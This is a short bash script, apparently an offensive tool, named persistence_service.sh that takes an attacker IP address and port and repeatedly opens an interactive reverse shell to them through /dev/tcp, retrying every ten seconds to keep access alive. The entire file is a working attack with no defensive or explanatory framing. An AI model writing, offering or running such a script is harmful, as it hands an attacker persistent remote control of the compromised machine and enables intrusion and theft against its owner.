#!/bin/bash
# persistence_service.sh - Run a loop to maintain a persistent reverse shell.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Launching persistent reverse shell to $1:$2..."
while true; do
  bash -i >& /dev/tcp/$1/$2 0>&1
  sleep 10
done
